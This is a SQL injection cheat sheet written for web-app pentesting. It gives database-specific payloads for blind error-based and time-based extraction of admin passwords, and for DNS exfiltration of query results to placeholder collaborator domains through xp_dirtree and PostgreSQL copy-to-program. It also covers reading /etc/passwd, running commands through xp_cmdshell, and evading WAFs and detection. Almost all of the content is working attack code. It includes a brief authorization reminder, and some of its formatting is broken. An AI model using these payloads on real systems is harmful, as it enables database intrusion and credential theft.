# SQL Injection Cheat Sheet

A practical SQL injection cheat sheet containing useful syntax, payload patterns, and DB-specific behaviours you’ll encounter during real-world web app pentesting.

---

## String Concatenation

Join multiple strings together.

| Database                 | Syntax                                                         |
| ------------------------ | -------------------------------------------------------------- |
| **Oracle**               | `'foo' \|\| 'bar'`                                             |
| **Microsoft SQL Server** | `'foo' + 'bar'`                                                |
| **PostgreSQL**           | `'foo' \|\| 'bar'`                                             |
| **MySQL**                | `'foo' 'bar'` *(space concatenation)*<br>`CONCAT('foo','bar')` |

---

## Substring Extraction

Offset index is **1-based**.

All return `"ba"` from `"foobar"`:

| Database   | Syntax                    |
| ---------- | ------------------------- |
| Oracle     | `SUBSTR('foobar',4,2)`    |
| Microsoft  | `SUBSTRING('foobar',4,2)` |
| PostgreSQL | `SUBSTRING('foobar',4,2)` |
| MySQL      | `SUBSTRING('foobar',4,2)` |

---

## SQL Comments (truncate rest of query)

| Database   | Syntax                                                         |
| ---------- | -------------------------------------------------------------- |
| Oracle     | `--comment`                                                    |
| Microsoft  | `--comment`, `/*comment*/`                                     |
| PostgreSQL | `--comment`, `/*comment*/`                                     |
| MySQL      | `#comment`<br>`-- comment` *(space required)*<br>`/*comment*/` |

---

## Finding Database Version

Useful for tailoring payloads.

| Database             | Query                                                              |
| -------------------- | ------------------------------------------------------------------ |
| Oracle               | `SELECT banner FROM v$version`<br>`SELECT version FROM v$instance` |
| Microsoft SQL Server | `SELECT @@version`                                                 |
| PostgreSQL           | `SELECT version()`                                                 |
| MySQL                | `SELECT @@version`                                                 |

---

## Enumerating Database Contents

### Tables and Columns

| Database   | Tables                                    | Columns                                                             |
| ---------- | ----------------------------------------- | ------------------------------------------------------------------- |
| Oracle     | `SELECT * FROM all_tables`                | `SELECT * FROM all_tab_columns WHERE table_name='TABLE'`            |
| MSSQL      | `SELECT * FROM information_schema.tables` | `SELECT * FROM information_schema.columns WHERE table_name='TABLE'` |
| PostgreSQL | Same as MSSQL                             | Same as MSSQL                                                       |
| MySQL      | Same as MSSQL                             | Same as MSSQL                                                       |

---

## Conditional Errors (Error-Based Blind SQLi)

Used to leak TRUE/FALSE by intentionally crashing the DB.

| Database   | Payload                                                                  |
| ---------- | ------------------------------------------------------------------------ |
| **Oracle** | `SELECT CASE WHEN (COND) THEN TO_CHAR(1/0) ELSE NULL END FROM dual`      |
| MSSQL      | `SELECT CASE WHEN (COND) THEN 1/0 ELSE NULL END`                         |
| PostgreSQL | `1 = (SELECT CASE WHEN (COND) THEN 1/(SELECT 0) ELSE NULL END)`          |
| MySQL      | `SELECT IF(COND,(SELECT table_name FROM information_schema.tables),'a')` |

### Oracle Injection Wrapper (most important)

`'||(SELECT CASE WHEN (YOUR_CONDITION)
THEN TO_CHAR(1/0) ELSE NULL END FROM dual)||'`

---

## Extracting Data via Visible Errors

| Database   | Example                                                    |
| ---------- | ---------------------------------------------------------- |
| MSSQL      | `SELECT 'foo' WHERE 1=(SELECT 'secret')`                   |
| PostgreSQL | `SELECT CAST((SELECT password FROM users LIMIT 1) AS int)` |
| MySQL      | `SELECT EXTRACTVALUE(1, CONCAT(0x5c,(SELECT 'secret')))`   |

---

## Batched / Stacked Queries

Execute multiple queries at once.

| Database   | Syntax                                                             |
| ---------- | ------------------------------------------------------------------ |
| Oracle     | ❌ Not supported                                                    |
| MSSQL      | `QUERY1; QUERY2`                                                   |
| PostgreSQL | `QUERY1; QUERY2`                                                   |
| MySQL      | `QUERY1; QUERY2` *(works only with some APIs like PDO or MySQLdb)* |

---

## Time Delays

Used for blind SQLi when no errors or output.

| Database   | Delay                                 |
| ---------- | ------------------------------------- |
| Oracle     | `dbms_pipe.receive_message(('a'),10)` |
| MSSQL      | `WAITFOR DELAY '0:0:10'`              |
| PostgreSQL | `SELECT pg_sleep(10)`                 |
| MySQL      | `SELECT SLEEP(10)`                    |

---

## Conditional Time Delays

Execute a delayed response only if condition is TRUE.

| DB         | Payload                                                          |   |                                                              |
| ---------- | ---------------------------------------------------------------- | - | ------------------------------------------------------------ |
| Oracle     | `SELECT CASE WHEN (COND) THEN 'a'                                |   | dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual` |
| MSSQL      | `IF(COND) WAITFOR DELAY '0:0:10'`                                |   |                                                              |
| PostgreSQL | `SELECT CASE WHEN (COND) THEN pg_sleep(10) ELSE pg_sleep(0) END` |   |                                                              |
| MySQL      | `SELECT IF(COND,SLEEP(10),'a')`                                  |   |                                                              |

---

## DNS lookups & DNS-based exfiltration (Collaborator / Interactsh / DNSLog)

You can force a backend database (or XML parser / OS command) to perform an outbound DNS lookup to a domain you control. This is extremely useful for **blind** data exfiltration or for detecting blind injection when there is no visible output.

**How it works (quick):**

1. Generate a unique interaction domain (one of the services below)

   * **Burp Collaborator** → `xxxx.burpcollab.net`
   * **Interactsh** → `yourid.interact.sh` (self-hostable / open-source)
   * **DNSLog / dnslog.cn / canarytokens** → quick public DNS logging domains
2. Inject a payload that causes the DB / XML parser / OS to resolve `DATA.YOURDOMAIN`
3. Poll the service to see DNS queries — the subdomain label can contain the exfiltrated data (encoded)

> Replace `BURP-COLLABORATOR-SUBDOMAIN` below with your unique collaborator/interaction domain. You can also use `INTERACTSH-ID`, `DNSLOG-ID`, or your own hosted DNS logging hostname.

### Quick notes / caveats

* Some techniques require **elevated privileges** on the DB (e.g., UTL_INADDR on Oracle, xp_dirtree on MSSQL).
* Windows UNC / LOAD_FILE / OUTFILE tricks only work when the DB runs on Windows and file sharing is allowed.
* DNS labels are limited in length — encode (base32/hex) and chunk results.
* URL / SQL-encode payloads where required and avoid simple WAF signatures.
* Rotate and randomize hostnames to reduce detection.

---

### Basic DNS lookup (no data exfiltration)

**Oracle (XXE)** — old but hits many unpatched installs:

```sql
SELECT EXTRACTVALUE(
  xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [
    <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/">
    %remote;
  ]>'),
  '/l'
) FROM dual;
```

**Oracle (elevated privs, patched installs):**

```sql
SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN') FROM dual;
```

**Microsoft SQL Server (xp_dirtree trick):**

```sql
exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'
```

**PostgreSQL (using copy to program, requires superuser or proper permissions):**

```sql
copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN';
```

**MySQL (Windows only — UNC / LOAD_FILE trick):**

```sql
LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')
```

or (Windows, OUTFILE):

```sql
SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\\a'
```

---

### DNS lookup WITH data exfiltration (put query result in the DNS name)

General idea: build a DNS name that includes the result of a query (or a chunk of it), trigger a lookup, then capture it from the collaborator.

> Keep exfil chunks short (≤ 40 chars per label). Encode output (base32/base36/hex) and chunk across multiple requests.

**Oracle**

```sql
SELECT EXTRACTVALUE(
  xmltype(
    '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [
      <!ENTITY % remote SYSTEM "http://' || (SELECT YOUR_QUERY_HERE) || '.BURP-COLLABORATOR-SUBDOMAIN/">
      %remote;
    ]>'
  ),
  '/l'
) FROM dual;
```

*Replace `(SELECT YOUR_QUERY_HERE)` with a subquery that returns a short string (e.g., `SUBSTR((SELECT password FROM users WHERE username='admin'),1,20)`), and encode/clean the output to safe DNS characters.*

**Microsoft SQL Server**

```sql
declare @p varchar(1024);
set @p = (SELECT TOP 1 SUBSTRING(CONVERT(varchar(8000), (SELECT TOP 1 password FROM users)),1,80));
exec('master..xp_dirtree "//' + @p + '.BURP-COLLABORATOR-SUBDOMAIN/a"');
```

*Use `CONVERT`/`SUBSTRING` to control size; may require `xp_dirtree` enabled and proper privileges.*

**PostgreSQL**

```sql
create or replace function f() returns void as $$
declare
  p text;
begin
  SELECT into p (SELECT substring((SELECT password FROM users LIMIT 1),1,60));
  execute 'copy (SELECT '''') to program ''nslookup ' || p || '.BURP-COLLABORATOR-SUBDOMAIN''';
END;
$$ language plpgsql security definer;

SELECT f();
```

*Requires `superuser` or `copy`-to-program permissions. Chunk and encode results.*

**MySQL (Windows only - OUTFILE trick)**

```sql
SELECT (SELECT substring((SELECT password FROM users LIMIT 1),1,60)) INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\\a';
```

*Works only on Windows hosts where MySQL has file-system write/read ability and UNC paths are allowed; often privileged.*

---

## Practical tips & service alternatives (use what we used)

* **Burp Collaborator** — canonical integrated tool for DNS/HTTP/SMTP interactions when using Burp.
* **Interactsh** — open-source, self-hostable, supports DNS & HTTP interactions and good for repeated/team tests.
* **DNSLog / dnslog.cn / canarytokens** — quick public DNS logging domains for rapid PoCs.
* **Custom DNS (self-hosted)** — `dnsmasq` / `bind` + logging gives full control and avoids public service limits.

**Which to choose?**

* Use **Burp Collaborator** for quick integrated flows inside Burp.
* Use **Interactsh** for stealth, team work, and repeatable tests (self-host if possible).
* Use **DNSLog / Canarytokens** for quick one-offs when you can’t run Burp or Interactsh.

---

## Encoding & chunking example (quick recipe)

1. `SELECT TO_BASE64(SUBSTRING(secret, pos, len))` (where supported), or use `RAWTOHEX()` / `TO_HEX()` etc.
2. Take the encoded chunk → `chunk.burpcollab.net`
3. Trigger DNS lookup.
4. Poll collaborator and reconstruct full secret from ordered chunks.

---

## Final warnings

* DNS exfiltration is noisy. Use short labels, encode safely, and chunk.
* Many production environments block outbound DNS or proxy requests — have fallback techniques (time-based extraction, error-based).
* Always have authorization for testing. These techniques are powerful — use only in permitted engagements.

---

# Bonus Pentester Payloads (Extra Section)

## Check Current Database User

SELECT user;
SELECT CURRENT_USER;
SELECT USER();

---

## Check Number of Rows

(SELECT COUNT(*) FROM users)

---

## Oracle: Extract ASCII Values (Ultimate Blind Extract)

'||(SELECT CASE WHEN (
ASCII(SUBSTR((SELECT password FROM users WHERE username='administrator'),POS,1)) > MID
) THEN TO_CHAR(1/0) ELSE NULL END FROM dual)||'

---

## 🔹 Determine Length of a String

(SELECT LENGTH(password) FROM users WHERE username='administrator')

---

## 🔹 Classic UNION SELECT Injection (MySQL/PostgreSQL/MSSQL)

UNION SELECT 1,2,'test'

---

## 🔹 PostgreSQL Read System Files (if allowed)

SELECT pg_read_file('/etc/passwd',0,2000);

---

## 🔹 SQL Server — Remote Command Execution (if xp_cmdshell enabled)

EXEC xp_cmdshell 'whoami';

yaml
Copy code

---

## 🔹 URL Double Encoding Bypass

%27 → '
%20 → space
%26 → &
%23 → #

---

## 🔹 Oracle String Injection Wrapper

Use this when injecting inside a quoted value:

'||PAYLOAD||'

---

# 🎯 Manual Blind Extraction Template

for pos in range(1, length):
test ASCII(midpoint) via conditional error
determine char

---
